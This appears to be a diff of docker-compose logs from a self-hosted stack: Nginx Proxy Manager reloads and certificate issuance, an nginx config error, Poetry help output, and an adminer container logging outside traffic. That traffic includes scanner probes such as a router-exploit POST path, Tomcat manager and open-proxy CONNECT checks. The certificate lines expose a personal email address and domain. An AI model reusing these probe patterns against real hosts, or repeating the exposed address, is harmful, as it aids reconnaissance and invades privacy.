+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://ip-ranges.amazonaws.com/ip-ranges.json
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v4
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v6
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [SSL      ] › ℹ  info      Let's Encrypt Renewal Timer initialized
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      IP Ranges Renewal Timer initialized
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [Global   ] › ℹ  info      Backend PID 166 listening on port 3000 ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:36:22 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:39 PM] [SSL      ] › ℹ  info      Requesting Let'sEncrypt certificates for Cert #1: dolodocker.mooo.com
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:39 PM] [SSL      ] › ℹ  info      Command: certbot certonly --config "/etc/letsencrypt.ini" --work-dir "/tmp/letsencrypt-lib" --logs-dir "/tmp/letsencrypt-log" --cert-name "npm-1" --agree-tos --authenticator webroot --email "siphokazidolo@gmail.com" --preferred-challenges "dns,http" --domains "dolodocker.mooo.com" 
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:39 PM] [Global   ] › ⬤  debug     CMD: certbot certonly --config "/etc/letsencrypt.ini" --work-dir "/tmp/letsencrypt-lib" --logs-dir "/tmp/letsencrypt-log" --cert-name "npm-1" --agree-tos --authenticator webroot --email "siphokazidolo@gmail.com" --preferred-challenges "dns,http" --domains "dolodocker.mooo.com" 
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [SSL      ] › ✔  success   Account registered.
+[32mnginx_proxy_manager |[0m Requesting a certificate for dolodocker.mooo.com
+[32mnginx_proxy_manager |[0m 
+[32mnginx_proxy_manager |[0m Successfully received certificate.
+[32mnginx_proxy_manager |[0m Certificate is saved at: /etc/letsencrypt/live/npm-1/fullchain.pem
+[32mnginx_proxy_manager |[0m Key is saved at:         /etc/letsencrypt/live/npm-1/privkey.pem
+[32mnginx_proxy_manager |[0m This certificate expires on 2024-10-07.
+[32mnginx_proxy_manager |[0m These files will be updated when the certificate renews.
+[32mnginx_proxy_manager |[0m NEXT STEPS:
+[32mnginx_proxy_manager |[0m - The certificate will need to be renewed before it expires. Certbot can automatically renew the certificate in the background, but you may need to take steps to enable that functionality. See https://certbot.org/renewal-setup for instructions.
+[32mnginx_proxy_manager |[0m 
+[32mnginx_proxy_manager |[0m - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[32mnginx_proxy_manager |[0m If you like Certbot, please consider supporting our work by:
+[32mnginx_proxy_manager |[0m  * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate
+[32mnginx_proxy_manager |[0m  * Donating to EFF:                    https://eff.org/donate-le
+[32mnginx_proxy_manager |[0m - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[32mnginx_proxy_manager |[0m 
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/temp/letsencrypt_1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Global   ] › ⬤  debug     CMD: openssl x509 -in /etc/letsencrypt/live/npm-1/fullchain.pem -subject -noout
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Global   ] › ⬤  debug     CMD: openssl x509 -in /etc/letsencrypt/live/npm-1/fullchain.pem -issuer -noout
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:47 PM] [Global   ] › ⬤  debug     CMD: openssl x509 -in /etc/letsencrypt/live/npm-1/fullchain.pem -dates -noout
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[36madminer      |[0m [Tue Jul  9 23:47:10 2024] [::ffff:94.156.10.163]:58816 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Tue Jul  9 23:47:10 2024] [::ffff:94.156.10.163]:58816 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:36 2024] [::ffff:199.45.154.113]:44260 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:39 2024] [::ffff:199.45.154.113]:44260 Invalid request (Connection reset by peer)
+[36madminer      |[0m [Tue Jul  9 23:51:39 2024] [::ffff:199.45.154.113]:44260 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:39 2024] [::ffff:199.45.154.113]:44262 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:45 2024] [::ffff:199.45.154.113]:44262 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 23:51:45 2024] [::ffff:199.45.154.113]:44262 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:50 2024] [::ffff:199.45.154.113]:46036 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:50 2024] [::ffff:199.45.154.113]:46036 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 23:51:50 2024] [::ffff:199.45.154.113]:46036 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:51 2024] [::ffff:199.45.154.113]:46062 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:51 2024] [::ffff:199.45.154.113]:46062 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 23:51:51 2024] [::ffff:199.45.154.113]:46062 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:52 2024] [::ffff:199.45.154.113]:46074 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:53 2024] [::ffff:199.45.154.113]:46074 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 23:51:53 2024] [::ffff:199.45.154.113]:46074 Closing
+[36madminer      |[0m [Tue Jul  9 23:51:54 2024] [::ffff:199.45.154.113]:51804 Accepted
+[36madminer      |[0m [Tue Jul  9 23:51:55 2024] [::ffff:199.45.154.113]:51804 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Tue Jul  9 23:51:55 2024] [::ffff:199.45.154.113]:51804 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:28 2024] [::ffff:199.45.154.115]:46194 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:31 2024] [::ffff:199.45.154.115]:46194 Invalid request (Connection reset by peer)
+[36madminer      |[0m [Wed Jul 10 00:13:31 2024] [::ffff:199.45.154.115]:46194 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:32 2024] [::ffff:199.45.154.115]:46290 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:37 2024] [::ffff:199.45.154.115]:46290 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 00:13:37 2024] [::ffff:199.45.154.115]:46290 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:42 2024] [::ffff:199.45.154.115]:39806 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:42 2024] [::ffff:199.45.154.115]:39806 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 00:13:42 2024] [::ffff:199.45.154.115]:39806 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:43 2024] [::ffff:199.45.154.115]:39822 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:44 2024] [::ffff:199.45.154.115]:39822 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 00:13:44 2024] [::ffff:199.45.154.115]:39822 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:44 2024] [::ffff:199.45.154.115]:40228 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:45 2024] [::ffff:199.45.154.115]:40228 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 00:13:45 2024] [::ffff:199.45.154.115]:40228 Closing
+[36madminer      |[0m [Wed Jul 10 00:13:45 2024] [::ffff:199.45.154.115]:40244 Accepted
+[36madminer      |[0m [Wed Jul 10 00:13:45 2024] [::ffff:199.45.154.115]:40244 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Wed Jul 10 00:13:45 2024] [::ffff:199.45.154.115]:40244 Closing
+[36madminer      |[0m [Wed Jul 10 00:45:13 2024] [::ffff:87.121.69.27]:35282 Accepted
+[36madminer      |[0m [Wed Jul 10 00:45:13 2024] [::ffff:87.121.69.27]:35282 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 00:45:13 2024] [::ffff:87.121.69.27]:35282 Closing
+[36madminer      |[0m [Wed Jul 10 00:45:53 2024] [::ffff:172.18.0.1]:39608 Accepted
+[36madminer      |[0m [Wed Jul 10 00:45:53 2024] [::ffff:172.18.0.1]:39608 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 00:45:53 2024] [::ffff:172.18.0.1]:39608 Closing
+[36madminer      |[0m [Wed Jul 10 01:04:40 2024] [::ffff:194.165.16.72]:65108 Accepted
+[36madminer      |[0m [Wed Jul 10 01:04:40 2024] [::ffff:194.165.16.72]:65108 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 01:04:40 2024] [::ffff:194.165.16.72]:65108 Closing
+[36madminer      |[0m [Wed Jul 10 01:31:58 2024] [::ffff:4.255.101.253]:40814 Accepted
+[36madminer      |[0m [Wed Jul 10 01:31:58 2024] [::ffff:4.255.101.253]:40814 [200]: GET /manager/html
+[36madminer      |[0m [Wed Jul 10 01:31:58 2024] [::ffff:4.255.101.253]:40814 Closing
+[36madminer      |[0m [Wed Jul 10 01:36:42 2024] [::ffff:141.98.11.15]:41768 Accepted
+[36madminer      |[0m [Wed Jul 10 01:36:42 2024] [::ffff:141.98.11.15]:41768 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 01:36:42 2024] [::ffff:141.98.11.15]:41768 Closing
+[36madminer      |[0m [Wed Jul 10 01:38:30 2024] [::ffff:185.191.126.213]:55458 Accepted
+[36madminer      |[0m [Wed Jul 10 01:38:30 2024] [::ffff:185.191.126.213]:55458 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 01:38:30 2024] [::ffff:185.191.126.213]:55458 Closing
+[36madminer      |[0m [Wed Jul 10 01:46:59 2024] [::ffff:172.18.0.1]:56912 Accepted
+[36madminer      |[0m [Wed Jul 10 01:46:59 2024] [::ffff:172.18.0.1]:56912 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 01:46:59 2024] [::ffff:172.18.0.1]:56912 Closing
+[36madminer      |[0m [Wed Jul 10 02:05:43 2024] [::ffff:87.236.176.223]:46849 Accepted
+[36madminer      |[0m [Wed Jul 10 02:05:46 2024] [::ffff:87.236.176.223]:46849 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:05:46 2024] [::ffff:87.236.176.223]:46849 Closing
+[36madminer      |[0m [Wed Jul 10 02:05:47 2024] [::ffff:87.236.176.93]:59897 Accepted
+[36madminer      |[0m [Wed Jul 10 02:05:47 2024] [::ffff:87.236.176.93]:59897 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 02:05:47 2024] [::ffff:87.236.176.93]:59897 Closing
+[36madminer      |[0m [Wed Jul 10 02:07:27 2024] [::ffff:94.156.10.163]:47396 Accepted
+[36madminer      |[0m [Wed Jul 10 02:07:27 2024] [::ffff:94.156.10.163]:47396 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 02:07:27 2024] [::ffff:94.156.10.163]:47396 Closing
+[36madminer      |[0m [Wed Jul 10 02:07:40 2024] [::ffff:87.121.69.27]:41748 Accepted
+[36madminer      |[0m [Wed Jul 10 02:07:40 2024] [::ffff:87.121.69.27]:41748 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 02:07:40 2024] [::ffff:87.121.69.27]:41748 Closing
+[36madminer      |[0m [Wed Jul 10 02:32:41 2024] [::ffff:171.4.8.37]:45685 Accepted
+[36madminer      |[0m [Wed Jul 10 02:32:41 2024] [::ffff:171.4.8.37]:45685 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:32:41 2024] [::ffff:171.4.8.37]:45685 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:22 2024] [::ffff:178.79.139.171]:54132 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:54132 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:54132 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46344 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46344 [200]: OPTIONS /
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46344 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:62839 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:62839 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:62839 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46352 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46352 [404]: OPTIONS /nice%20ports%2C/Tri%6Eity.txt%2ebak - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46352 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46374 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46368 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46380 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46386 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46396 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46404 Accepted
+[35mnginx_webserver |[0m /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
+[35mnginx_webserver |[0m 10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
+[35mnginx_webserver |[0m 10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
+[35mnginx_webserver |[0m /docker-entrypoint.sh: Configuration complete; ready for start up
+[35mnginx_webserver |[0m 2024/07/09 17:03:44 [emerg] 1#1: "server" directive is not allowed here in /etc/nginx/nginx.conf:41
+[35mnginx_webserver |[0m nginx: [emerg] "server" directive is not allowed here in /etc/nginx/nginx.conf:41
+[33mfastapi_app  |[0m INFO:__main__:Initial data created
+[33mfastapi_app  |[0m Poetry (version 1.8.3)
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Usage:
+[33mfastapi_app  |[0m   command [options] [arguments]
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Options:
+[33mfastapi_app  |[0m   -h, --help                 Display help for the given command. When no command is given display help for the list command.
+[33mfastapi_app  |[0m   -q, --quiet                Do not output any message.
+[33mfastapi_app  |[0m   -V, --version              Display this application version.
+[33mfastapi_app  |[0m       --ansi                 Force ANSI output.
+[33mfastapi_app  |[0m       --no-ansi              Disable ANSI output.
+[33mfastapi_app  |[0m   -n, --no-interaction       Do not ask any interactive question.
+[33mfastapi_app  |[0m       --no-plugins           Disables plugins.
+[33mfastapi_app  |[0m       --no-cache             Disables Poetry source caches.
+[33mfastapi_app  |[0m   -C, --directory=DIRECTORY  The working directory for the Poetry command (defaults to the current working directory).
+[33mfastapi_app  |[0m   -v|vv|vvv, --verbose       Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Available commands:
+[33mfastapi_app  |[0m   about              Shows information about Poetry.
+[33mfastapi_app  |[0m   add                Adds a new dependency to pyproject.toml and installs it.
+[33mfastapi_app  |[0m   build              Builds a package, as a tarball and a wheel by default.
+[33mfastapi_app  |[0m   check              Validates the content of the pyproject.toml file and its consistency with the poetry.lock file.
+[33mfastapi_app  |[0m   config             Manages configuration settings.
+[33mfastapi_app  |[0m   export             Exports the lock file to alternative formats.
+[33mfastapi_app  |[0m   help               Displays help for a command.
+[33mfastapi_app  |[0m   init               Creates a basic pyproject.toml file in the current directory.
+[33mfastapi_app  |[0m   install            Installs the project dependencies.
+[33mfastapi_app  |[0m   list               Lists commands.
+[33mfastapi_app  |[0m   lock               Locks the project dependencies.
+[33mfastapi_app  |[0m   new                Creates a new Python project at <path>.
+[33mfastapi_app  |[0m   publish            Publishes a package to a remote repository.
+[33mfastapi_app  |[0m   remove             Removes a package from the project dependencies.
+[33mfastapi_app  |[0m   run                Runs a command in the appropriate environment.
+[33mfastapi_app  |[0m   search             Searches for packages on remote repositories.
+[33mfastapi_app  |[0m   shell              Spawns a shell within the virtual environment.
+[33mfastapi_app  |[0m   show               Shows information about packages.
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:37:48 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [6:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [6:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [7:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [7:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [8:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [8:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:04:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:38 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:16:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:00 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/3.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:00 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/3.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:01 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:01 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:18:01 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:19:43 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
